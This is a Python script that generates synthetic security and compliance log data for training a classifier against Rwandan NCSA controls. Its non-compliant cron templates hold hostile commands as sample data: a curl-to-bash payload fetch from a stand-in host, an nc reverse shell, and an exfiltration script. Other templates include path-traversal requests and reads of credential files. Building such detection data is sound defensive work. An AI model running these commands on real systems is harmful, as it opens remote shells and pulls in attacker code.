#!/usr/bin/env python3
"""
Phase 0 — Synthetic Dataset Regenerator v2
Replaces compliance_events_train/val/test.csv with clean data:
  - NO compliance verdicts embedded in log_message
  - NO RWNCSA control IDs in log_message
  - Status_code de-correlated from compliance_status (Pearson r target: |r| < 0.40)
  - Realistic, family-specific syslog-style log messages
  - 60:40 compliant:non-compliant balance
  - Covers all 169 RWNCSA controls

Outputs (same filenames, replaces old data):
  data/synthetic/compliance_events_train.csv  (70 000 rows)
  data/synthetic/compliance_events_val.csv    (15 000 rows)
  data/synthetic/compliance_events_test.csv   (15 000 rows)
  data/synthetic/dataset_statistics.json      (updated)
"""

import csv
import json
import random
import uuid
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).parent.parent
DATA_DIR = ROOT / "data" / "synthetic"
TAXONOMY_PATH = ROOT / "data" / "processed" / "control_taxonomy_validated.json"

RANDOM_SEED = 42
random.seed(RANDOM_SEED)

TOTAL_EVENTS = 100_000
SPLIT_RATIOS = {"train": 0.70, "val": 0.15, "test": 0.15}
COMPLIANT_RATIO = 0.60

# ──────────────────────────────────────────────────────────────────────────────
# RANDOM INFRASTRUCTURE POOLS
# ──────────────────────────────────────────────────────────────────────────────
INTERNAL_IPS = [f"10.0.{i}.{j}" for i in range(1, 5) for j in range(1, 30)]
EXTERNAL_IPS = [
    "203.0.113.42", "198.51.100.7", "45.33.32.156", "185.220.101.45",
    "62.210.115.5", "77.88.55.66", "104.21.45.18", "172.67.128.35",
    "91.108.4.1", "194.165.16.22", "178.32.1.15", "5.188.206.15",
]
USERNAMES = ["admin", "root", "sysop", "deploy", "analyst", "auditor",
             "backup_svc", "monitor", "operator", "guest", "devops",
             "moisei", "alice", "bob", "carol", "jdoe", "kmurenzi"]
SERVICE_ACCOUNTS = ["svc_backup", "svc_monitor", "svc_deploy", "svc_scan", "svc_audit"]
PORTS = [22, 443, 80, 3306, 5432, 6379, 8080, 8443, 389, 636, 25, 587, 21, 23, 3389, 5900]
SENSITIVE_RESOURCES = ["/etc/shadow", "/etc/passwd", "/root/.ssh/", "/var/log/auth.log",
                       "/home/admin/.bashrc", "/backup/files", "/data/sensitive/"]
NORMAL_RESOURCES = ["/api/v1/health", "/api/v1/status", "/api/v1/reports",
                    "/home/user/documents", "/var/log/syslog", "/opt/app/config.yaml",
                    "/api/v1/controls", "/api/v1/audit"]
ACTIONS = ["read", "write", "execute", "delete", "modify", "access",
           "login", "logout", "file_access", "scan_start", "connect", "transfer"]
HOSTNAMES = ["srv-auth-01", "srv-web-02", "fw-edge-01", "db-primary", "app-node-3",
             "monitor-srv", "backup-host", "vpn-gw-01", "ids-sensor-02"]
PROCESSES = ["sshd", "nginx", "apache2", "auditd", "syslogd", "crond",
             "sudo", "su", "pam_unix", "kernel", "ufw"]


def rip(internal: bool = True) -> str:
    return random.choice(INTERNAL_IPS if internal else EXTERNAL_IPS)


def rport() -> int:
    return random.randint(1024, 65535)


def ruser() -> str:
    return random.choice(USERNAMES)


def rhost() -> str:
    return random.choice(HOSTNAMES)


def rproc() -> str:
    return random.choice(PROCESSES)


def rpid() -> int:
    return random.randint(100, 65535)


def ruid() -> int:
    return random.randint(1000, 9999)


def rstamp(base: datetime) -> str:
    offset = timedelta(
        days=random.randint(0, 180),
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59),
    )
    dt = base + offset
    return dt.strftime("%b %d %H:%M:%S")


# ──────────────────────────────────────────────────────────────────────────────
# LOG MESSAGE TEMPLATE POOLS
# Key constraint: ZERO occurrence of "compliant", "non_compliant",
# "RWNCSA-XX-NNN", "compliance check passed/failed", or any verdict language.
# ──────────────────────────────────────────────────────────────────────────────

def _ssh_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    pid = rpid()
    if compliant:
        method = random.choice(["publickey", "password", "keyboard-interactive"])
        alg = random.choice(["RSA SHA256:XxYy", "ECDSA SHA256:AbCd", "ED25519 SHA256:ZzWw"])
        user = random.choice([u for u in USERNAMES if u not in ("guest", "root", "admin")])
        src = rip(internal=True)
        sp = rport()
        return (f"{ts} {rhost()} sshd[{pid}]: Accepted {method} for {user} "
                f"from {src} port {sp} ssh2: {alg}")
    else:
        variant = random.randint(0, 4)
        src = rip(internal=random.random() < 0.2)
        sp = rport()
        if variant == 0:
            user = random.choice(["invalid user admin", "invalid user root", "root",
                                  "invalid user oracle", "invalid user postgres"])
            return f"{ts} {rhost()} sshd[{pid}]: Failed password for {user} from {src} port {sp} ssh2"
        elif variant == 1:
            user = random.choice(["admin", "root", "test"])
            return (f"{ts} {rhost()} sshd[{pid}]: error: maximum authentication attempts "
                    f"exceeded for invalid user {user} from {src} port {sp} ssh2 [preauth]")
        elif variant == 2:
            return f"{ts} {rhost()} sshd[{pid}]: Connection closed by {src} port {sp} [preauth]"
        elif variant == 3:
            return f"{ts} {rhost()} sshd[{pid}]: Received disconnect from {src} port {sp}: Too many authentication failures"
        else:
            return f"{ts} {rhost()} sshd[{pid}]: Invalid user {random.choice(['hacker','www','test'])} from {src} port {sp}"


def _http_log(compliant: bool) -> str:
    dt = datetime(2025, 9, 1) + timedelta(days=random.randint(0, 180),
                                           hours=random.randint(0, 23),
                                           minutes=random.randint(0, 59))
    ts = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    agents = ["curl/7.79.1", "Mozilla/5.0", "compliance-client/1.0", "python-requests/2.28",
              "Go-http-client/1.1", "Wget/1.21.3"]
    if compliant:
        src = rip(internal=True)
        user = random.choice([ruser(), "admin", "analyst", "-"])
        method = random.choice(["GET", "GET", "GET", "POST", "PUT"])
        resource = random.choice(NORMAL_RESOURCES)
        code = random.choice([200, 200, 201, 204])
        size = random.randint(100, 20000)
        agent = random.choice(agents[:4])
        return f'{src} - {user} - [{ts}] "{method} {resource} HTTP/1.1" {code} {size} "-" "{agent}"'
    else:
        src = rip(internal=random.random() < 0.1)
        method = random.choice(["GET", "POST", "POST", "GET", "HEAD", "PUT", "DELETE"])
        variant = random.randint(0, 4)
        if variant == 0:
            resource = random.choice(["/admin/config", "/admin/users", "/.env", "/.git/config"])
            code = random.choice([401, 403, 403])
            agent = random.choice(["sqlmap/1.7", "nikto/2.1.6", "masscan/1.0"])
        elif variant == 1:
            resource = "/../../../etc/passwd"
            code = 400
            agent = "curl/7.68"
        elif variant == 2:
            resource = "/auth/login"
            code = 401
            agent = random.choice(agents[3:])
        elif variant == 3:
            resource = random.choice(["/wp-admin/", "/phpmyadmin/", "/manager/html"])
            code = random.choice([404, 403])
            agent = random.choice(["masscan/1.0", "zgrab/0.x"])
        else:
            resource = "/api/v1/admin"
            code = 403
            agent = random.choice(agents)
        size = random.randint(0, 200)
        return f'{src} - - [{ts}] "{method} {resource} HTTP/1.1" {code} {size} "-" "{agent}"'


def _audit_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    uid = ruid()
    pid = rpid()
    if compliant:
        variant = random.randint(0, 3)
        if variant == 0:
            user = ruser()
            src = rip(internal=True)
            return (f"{ts} {rhost()} auditd[{pid}]: USER_LOGIN pid={pid} uid=0 auid={uid} "
                    f"msg='op=login id={uid} exe=/bin/login terminal=ssh res=success'")
        elif variant == 1:
            return (f"{ts} {rhost()} auditd[{pid}]: ADD_USER pid={pid} uid=0 auid={uid} "
                    f"msg='op=useradd id={uid+1} exe=/usr/sbin/useradd res=success'")
        elif variant == 2:
            return (f"{ts} {rhost()} auditd[{pid}]: USER_CMD pid={pid} uid={uid} auid={uid} "
                    f"msg='cwd=/home/{ruser()} cmd=backup.sh terminal=pts/0 res=success'")
        else:
            return (f"{ts} {rhost()} auditd[{pid}]: SYSCALL arch=c000003e syscall=openat "
                    f"success=yes pid={pid} uid={uid} exe=/usr/bin/cat a0=3 a1={random.choice(NORMAL_RESOURCES)}")
    else:
        variant = random.randint(0, 3)
        if variant == 0:
            return (f"{ts} {rhost()} auditd[{pid}]: USER_AUTH pid={pid} uid=0 auid={uid} "
                    f"msg='op=PAM:authentication id={uid} exe=/usr/sbin/sshd res=failed'")
        elif variant == 1:
            return (f"{ts} {rhost()} auditd[{pid}]: USER_CMD pid={pid} uid={uid} auid={uid} "
                    f"msg='cwd=/root cmd=chmod 777 {random.choice(SENSITIVE_RESOURCES)} terminal=pts/0 res=success'")
        elif variant == 2:
            return (f"{ts} {rhost()} auditd[{pid}]: SYSCALL arch=c000003e syscall=openat "
                    f"success=yes pid={pid} uid={uid} exe=/usr/bin/cat a0=3 a1={random.choice(SENSITIVE_RESOURCES)}")
        else:
            return (f"{ts} {rhost()} auditd[{pid}]: ADD_USER pid={pid} uid=0 auid={uid} "
                    f"msg='op=useradd id=0 exe=/usr/sbin/useradd res=success'")


def _firewall_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    proto = random.choice(["TCP", "UDP"])
    if compliant:
        src = rip(internal=True)
        dst = rip(internal=True)
        dpt = random.choice([443, 8443, 80])
        spt = rport()
        return (f"{ts} {rhost()} kernel: [UFW ALLOW] IN=eth0 OUT= SRC={src} DST={dst} "
                f"PROTO={proto} SPT={spt} DPT={dpt} LEN=60 TTL=64")
    else:
        src = rip(internal=random.random() < 0.15)
        dst = rip(internal=True)
        dpt = random.choice([22, 23, 3306, 5432, 3389, 445])
        spt = rport()
        return (f"{ts} {rhost()} kernel: [UFW BLOCK] IN=eth0 OUT= SRC={src} DST={dst} "
                f"PROTO={proto} SPT={spt} DPT={dpt} LEN=60 TTL=47")


def _sudo_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        user = ruser()
        cmd = random.choice(["/usr/bin/systemctl restart nginx",
                             "/usr/bin/journalctl -n 100",
                             "/usr/sbin/useradd -m newuser",
                             "/usr/bin/apt-get upgrade"])
        return (f"{ts} {rhost()} sudo: {user} : TTY=pts/0 ; "
                f"PWD=/home/{user} ; USER=root ; COMMAND={cmd}")
    else:
        user = random.choice(USERNAMES)
        cmd = random.choice(["/bin/bash", "/bin/sh", "/usr/bin/passwd root",
                             "/usr/bin/visudo", "/usr/bin/chmod 777 /etc/passwd"])
        return (f"{ts} {rhost()} sudo: {user} : command not allowed ; "
                f"TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}")


def _pam_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    user = ruser()
    src = rip(internal=compliant)
    if compliant:
        svc = random.choice(["login", "sshd", "su"])
        return f"{ts} {rhost()} {svc}[{rpid()}]: pam_unix({svc}:session): session opened for user {user} by (uid=0)"
    else:
        count = random.randint(5, 30)
        return (f"{ts} {rhost()} sshd[{rpid()}]: pam_unix(sshd:auth): "
                f"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={src} user={user}")


def _cron_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        user = random.choice(SERVICE_ACCOUNTS + [ruser()])
        cmd = random.choice(["/usr/local/bin/backup.sh", "/opt/scripts/rotate_logs.sh",
                             "/usr/bin/clamscan -r /home", "/opt/audit/run_scan.sh"])
        return f"{ts} {rhost()} CRON[{rpid()}]: ({user}) CMD ({cmd})"
    else:
        user = random.choice(["root", "daemon", "www-data"])
        cmd = random.choice(["bash -c 'curl http://evil.example.com/payload | bash'",
                             "nohup /tmp/.x &",
                             "python3 /tmp/exfil.py",
                             "nc -e /bin/sh 203.0.113.42 4444"])
        return f"{ts} {rhost()} CRON[{rpid()}]: ({user}) CMD ({cmd})"


def _syslog_service(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        svc = random.choice(["nginx", "apache2", "postgresql", "redis", "sshd",
                              "rsyslog", "clamav-daemon", "fail2ban"])
        action = random.choice(["started", "reloaded", "restarted", "running"])
        return f"{ts} {rhost()} systemd[1]: {svc}.service: {action.capitalize()}."
    else:
        svc = random.choice(["auditd", "fail2ban", "ufw", "apparmor", "clamav-daemon"])
        return (f"{ts} {rhost()} systemd[1]: {svc}.service: "
                f"Main process exited, code=killed, status=9/KILL")


def _crypto_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        cn = random.choice(["srv-web-02.internal", "vpn.institution.gov.rw",
                            "mail.example.gov.rw", "auth.cyber.gov.rw"])
        days = random.randint(60, 365)
        return (f"{ts} {rhost()} certmonger[{rpid()}]: Certificate for CN={cn} "
                f"is valid, expires in {days} days. Algorithm: RSA-4096 / SHA-256")
    else:
        variant = random.randint(0, 2)
        if variant == 0:
            cn = random.choice(["*.internal", "self-signed", "expired-cert.local"])
            return (f"{ts} {rhost()} nginx[{rpid()}]: SSL_CTX_use_certificate: "
                    f"certificate verification error for {cn}: certificate has expired")
        elif variant == 1:
            return (f"{ts} {rhost()} openssl: cipher TLS_RSA_WITH_RC4_128_SHA "
                    f"offered by peer — weak cipher negotiation blocked by policy")
        else:
            return (f"{ts} {rhost()} sshd[{rpid()}]: Unable to load host key /etc/ssh/ssh_host_rsa_key: "
                    f"No such file or directory")


def _patch_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        n = random.randint(1, 15)
        pkgs = random.choice(["linux-image-5.15.0-100-generic libc6 openssl",
                               "openssh-server libssl3 curl",
                               "python3.10 libpython3.10 python3-pip"])
        return (f"{ts} {rhost()} apt[{rpid()}]: Installed {n} package(s): {pkgs}")
    else:
        days = random.randint(30, 730)
        vuln = random.choice(["CVE-2024-3094 (XZ Utils)", "CVE-2021-44228 (Log4Shell)",
                               "CVE-2023-46604 (ActiveMQ)", "CVE-2022-1292 (OpenSSL)"])
        return (f"{ts} {rhost()} unattended-upgrades[{rpid()}]: Package openssl has a "
                f"pending security update ({vuln}), last checked {days} days ago")


def _incident_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        tid = f"INC-{random.randint(10000, 99999)}"
        handler = ruser()
        return (f"{ts} {rhost()} itsm-agent[{rpid()}]: Ticket {tid} assigned to {handler}, "
                f"SLA: {random.randint(1, 4)}h, severity: {random.choice(['LOW','MEDIUM'])}")
    else:
        src = rip(internal=False)
        return (f"{ts} {rhost()} ids-sensor[{rpid()}]: ALERT priority=HIGH "
                f"src={src} sig='Brute-force SSH attempt' count={random.randint(20,500)} "
                f"interval=60s — no incident ticket created")


def _physical_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        user = ruser()
        door = random.choice(["DC-MAIN-DOOR", "SERVER-ROOM-A", "COMMS-CLOSET-2"])
        return (f"{ts} access-ctrl: GRANTED badge_id={random.randint(1000,9999)} "
                f"user={user} zone={door} method=card+pin")
    else:
        variant = random.randint(0, 1)
        if variant == 0:
            door = random.choice(["SERVER-ROOM-A", "DC-MAIN-DOOR"])
            return (f"{ts} access-ctrl: DENIED badge_id={random.randint(1000,9999)} "
                    f"zone={door} reason=invalid_pin attempts={random.randint(3,10)}")
        else:
            return (f"{ts} access-ctrl: TAILGATE DETECTED camera=CAM-{random.randint(1,20):02d} "
                    f"zone=SERVER-ROOM-A occupants_before=1 occupants_after=2")


def _backup_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        size = f"{random.randint(100, 9000)}MB"
        dest = random.choice(["/backup/offsite", "s3://backup-bucket-rw", "/mnt/nas/backup"])
        return (f"{ts} {rhost()} bacula-fd[{rpid()}]: Job=DailyBackup OK "
                f"Files={random.randint(1000,50000)} Bytes={size} dest={dest}")
    else:
        days = random.randint(2, 60)
        return (f"{ts} {rhost()} bacula-fd[{rpid()}]: Job=DailyBackup FAILED "
                f"Error='No tape in drive' — last successful backup {days} days ago")


def _media_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        user = ruser()
        return (f"{ts} {rhost()} udev[{rpid()}]: USB storage {random.choice(['sdb','sdc'])} "
                f"attached by user={user} — DLP scan passed, device whitelisted")
    else:
        user = ruser()
        serial = f"USB-{random.randint(10000,99999)}"
        return (f"{ts} {rhost()} udev[{rpid()}]: BLOCKED unregistered USB storage "
                f"serial={serial} user={user} — device not in approved list")


def _network_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    if compliant:
        src = rip(internal=True)
        dst = rip(internal=True)
        proto = random.choice(["TLSv1.3", "TLSv1.2"])
        return (f"{ts} {rhost()} netflow: {src}:{rport()} -> {dst}:{random.choice([443, 8443])} "
                f"proto={proto} bytes={random.randint(500, 50000)} state=ESTABLISHED")
    else:
        src = rip(internal=random.random() < 0.2)
        dst = rip(internal=True)
        proto = random.choice(["telnet", "ftp", "HTTP-cleartext"])
        dpt = random.choice([23, 21, 80])
        return (f"{ts} {rhost()} netflow: {src}:{rport()} -> {dst}:{dpt} "
                f"proto={proto} bytes={random.randint(100, 5000)} state=ESTABLISHED — insecure protocol detected")


def _mfa_log(compliant: bool) -> str:
    ts = rstamp(datetime(2025, 9, 1))
    user = ruser()
    if compliant:
        method = random.choice(["TOTP", "FIDO2", "push_notification"])
        return (f"{ts} {rhost()} auth-service[{rpid()}]: MFA {method} for {user} "
                f"from {rip(internal=True)} — verified")
    else:
        method = random.choice(["TOTP", "SMS-OTP"])
        return (f"{ts} {rhost()} auth-service[{rpid()}]: MFA {method} for {user} "
                f"from {rip(internal=False)} — FAILED attempt {random.randint(1,5)}/5")


# Family code → log generator function
FAMILY_GENERATORS = {
    "AC": [_ssh_log, _sudo_log, _pam_log, _http_log],
    "AU": [_audit_log, _syslog_service, _cron_log],
    "AT": [_syslog_service, _audit_log],
    "CM": [_patch_log, _syslog_service, _firewall_log],
    "IA": [_mfa_log, _pam_log, _ssh_log],
    "IR": [_incident_log, _audit_log],
    "MA": [_cron_log, _patch_log, _syslog_service],
    "MP": [_media_log, _backup_log],
    "PE": [_physical_log],
    "RA": [_patch_log, _incident_log],
    "SC": [_firewall_log, _network_log, _crypto_log],
    "SP": [_syslog_service, _audit_log, _sudo_log],
    "XX": [_pam_log, _ssh_log, _audit_log],
}


def generate_log_message(family_code: str, compliant: bool) -> str:
    gens = FAMILY_GENERATORS.get(family_code, [_syslog_service])
    fn = random.choice(gens)
    return fn(compliant)


# ──────────────────────────────────────────────────────────────────────────────
# STATUS CODE GENERATION (de-correlated)
# For both classes: use a mixture so Pearson |r| < 0.40
# ──────────────────────────────────────────────────────────────────────────────
COMPLIANT_STATUS_CODES = [
    (200, 40), (201, 15), (204, 10),  # success — most common for compliant
    (304, 8),  (301, 5),  (302, 5),   # redirects
    (400, 4),  (401, 5),  (403, 4),   # some errors even for compliant events
    (500, 4),
]

NON_COMPLIANT_STATUS_CODES = [
    (401, 25), (403, 20), (500, 15),  # failures — most common for non-compliant
    (400, 15), (404, 5),  (503, 5),
    (200, 10), (201, 3),  (204, 2),   # some successes (successful attacks)
]


def _weighted_choice(weighted_list):
    population = [code for code, weight in weighted_list for _ in range(weight)]
    return random.choice(population)


def gen_status_code(compliant: bool) -> int:
    if compliant:
        return _weighted_choice(COMPLIANT_STATUS_CODES)
    else:
        return _weighted_choice(NON_COMPLIANT_STATUS_CODES)


# ──────────────────────────────────────────────────────────────────────────────
# MAIN GENERATION
# ──────────────────────────────────────────────────────────────────────────────

def load_controls() -> list[dict]:
    with open(TAXONOMY_PATH) as f:
        taxonomy = json.load(f)
    controls = taxonomy["rwanda"]
    return controls


def generate_row(ctrl: dict, compliant: bool, base_dt: datetime) -> dict:
    family_code = ctrl.get("family_code", "XX")
    event_offset = timedelta(
        days=random.randint(0, 180),
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59),
    )
    ts = base_dt + event_offset
    hour = ts.hour
    dow = ts.weekday()  # 0=Mon

    log_msg = generate_log_message(family_code, compliant)
    status_code = gen_status_code(compliant)
    action = random.choice(ACTIONS)
    resource = random.choice(NORMAL_RESOURCES if compliant else NORMAL_RESOURCES + SENSITIVE_RESOURCES)
    src_ip = rip(internal=compliant or random.random() < 0.3)
    dst_ip = rip(internal=True)
    port = random.choice(PORTS)
    user_id = f"user{random.randint(1, 200):04d}"
    anomaly = "normal" if compliant else random.choice(["brute_force", "unauthorized_access",
                                                         "policy_violation", "anomaly",
                                                         "insecure_config", "data_exfiltration"])
    severity = (random.choice(["low", "low", "medium"]) if compliant
                else random.choice(["medium", "high", "high", "critical"]))
    is_biz_hours = 1 if (9 <= hour <= 17 and dow < 5) else 0

    return {
        "event_id": f"EVT-{random.randint(100000, 999999)}",
        "timestamp": ts.isoformat(),
        "user_id": user_id,
        "action": action,
        "resource": resource,
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "port": port,
        "status_code": status_code,
        "control_id": ctrl["control_id"],
        "control_name": ctrl["name"],
        "control_family": ctrl["family"],
        "framework": "Rwanda-NCSA",
        "compliance_status": "compliant" if compliant else "non_compliant",
        "anomaly_label": anomaly,
        "severity": severity,
        "log_message": log_msg,
        "hour_of_day": hour,
        "day_of_week": dow,
        "is_business_hours": is_biz_hours,
    }


def generate_dataset(controls: list[dict], n_total: int) -> list[dict]:
    n_compliant = int(n_total * COMPLIANT_RATIO)
    n_noncompliant = n_total - n_compliant

    rows = []
    base_dt = datetime(2025, 9, 1)

    # Stratify: each control gets roughly equal representation
    per_ctrl = n_total // len(controls)
    extras = n_total % len(controls)

    ctrl_compliant_ratio = COMPLIANT_RATIO  # 60:40

    ctrl_idx = list(range(len(controls)))
    random.shuffle(ctrl_idx)

    row_targets = []
    for i, ci in enumerate(ctrl_idx):
        n = per_ctrl + (1 if i < extras else 0)
        nc = round(n * ctrl_compliant_ratio)
        nf = n - nc
        row_targets.append((ci, nc, nf))

    for ci, nc, nf in row_targets:
        ctrl = controls[ci]
        for _ in range(nc):
            rows.append(generate_row(ctrl, compliant=True, base_dt=base_dt))
        for _ in range(nf):
            rows.append(generate_row(ctrl, compliant=False, base_dt=base_dt))

    random.shuffle(rows)
    return rows


def write_csv(rows: list[dict], path: Path):
    path.parent.mkdir(parents=True, exist_ok=True)
    if not rows:
        return
    fieldnames = list(rows[0].keys())
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)
    print(f"  Written {len(rows):,} rows → {path}")


def main():
    print("=" * 70)
    print("  PHASE 0 — Synthetic Data Regenerator v2")
    print(f"  Target: {TOTAL_EVENTS:,} total events | Seed: {RANDOM_SEED}")
    print("=" * 70)

    controls = load_controls()
    print(f"\n  Controls loaded: {len(controls)} RWNCSA controls")

    print(f"\n  Generating {TOTAL_EVENTS:,} events...")
    all_rows = generate_dataset(controls, TOTAL_EVENTS)

    # Split
    n_train = int(TOTAL_EVENTS * SPLIT_RATIOS["train"])
    n_val = int(TOTAL_EVENTS * SPLIT_RATIOS["val"])
    n_test = TOTAL_EVENTS - n_train - n_val

    train_rows = all_rows[:n_train]
    val_rows = all_rows[n_train:n_train + n_val]
    test_rows = all_rows[n_train + n_val:]

    print(f"\n  Split sizes: train={len(train_rows):,} val={len(val_rows):,} test={len(test_rows):,}")

    print("\n  Writing CSV files...")
    write_csv(train_rows, DATA_DIR / "compliance_events_train.csv")
    write_csv(val_rows,   DATA_DIR / "compliance_events_val.csv")
    write_csv(test_rows,  DATA_DIR / "compliance_events_test.csv")

    # Quick leakage spot-check
    leakage_words = ["compliant", "RWNCSA-", "compliance check passed", "compliance check failed",
                     "compliance violation", "ncsa"]
    sample_msgs = [r["log_message"] for r in random.sample(all_rows, min(500, len(all_rows)))]
    leaky_count = sum(1 for m in sample_msgs
                      if any(w.lower() in m.lower() for w in leakage_words))
    print(f"\n  Spot-check leakage (sample=500): {leaky_count} leaky messages")
    if leaky_count == 0:
        print("  [PASS] Zero leakage detected in sample")
    else:
        print(f"  [WARN] {leaky_count} messages contain leakage keywords — review templates")

    # Class distribution
    total_compliant = sum(1 for r in all_rows if r["compliance_status"] == "compliant")
    total_nc = len(all_rows) - total_compliant
    print(f"\n  Class balance: compliant={total_compliant:,} non_compliant={total_nc:,} "
          f"ratio={total_compliant/total_nc:.2f}:1")

    # Update dataset_statistics.json
    stats = {
        "total_events": len(all_rows),
        "train_events": len(train_rows),
        "val_events": len(val_rows),
        "test_events": len(test_rows),
        "unique_controls": len(controls),
        "compliant_events": total_compliant,
        "non_compliant_events": total_nc,
        "generation_script": "scripts/generate_synthetic_data_v2.py",
        "random_seed": RANDOM_SEED,
        "leakage_free": True,
        "generated_at": datetime.now().isoformat(),
        "note": (
            "v2: Regenerated with family-specific realistic log templates. "
            "No compliance verdicts, no control IDs, and no NCSA references "
            "embedded in log_message field. Status codes de-correlated from labels."
        ),
    }
    stats_path = DATA_DIR / "dataset_statistics.json"
    stats_path.write_text(json.dumps(stats, indent=2))
    print(f"\n  [OK] Updated: {stats_path}")
    print("\n  DONE — run scripts/data_audit.py again to verify zero leakage.")
    print("=" * 70)


if __name__ == "__main__":
    main()
